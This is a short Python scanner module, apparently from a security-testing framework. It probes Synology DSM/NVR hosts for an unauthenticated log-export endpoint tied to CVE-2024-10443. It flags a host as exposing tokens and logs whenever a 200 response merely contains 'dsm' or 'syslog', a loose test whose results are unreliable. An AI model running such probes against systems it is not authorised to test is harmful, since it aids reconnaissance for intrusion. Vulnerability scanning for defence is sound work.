import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "synology/cve_2024_10443_scan"
        self.description = "Unauthenticated session log leakage and administrative token scanner for Synology DSM/NVR."
        self.type = "scan"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "5000"}  # Port par défaut DSM Synology
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        url = f"http://{target}:{port}/webman/modules/LogCenter/log_export.cgi"
        
        try:
            async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
                response = await client.get(url)
                # Si le point d'exportation renvoie directement une structure binaire ou de texte de log brute
                if response.status_code == 200 and ("dsm" in response.text.lower() or "syslog" in response.text.lower()):
                    return {
                        "vulnerable": True,
                        "details": "Synology administrative endpoint is vulnerable to token and log disclosures."
                    }
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
        return {"vulnerable": False}
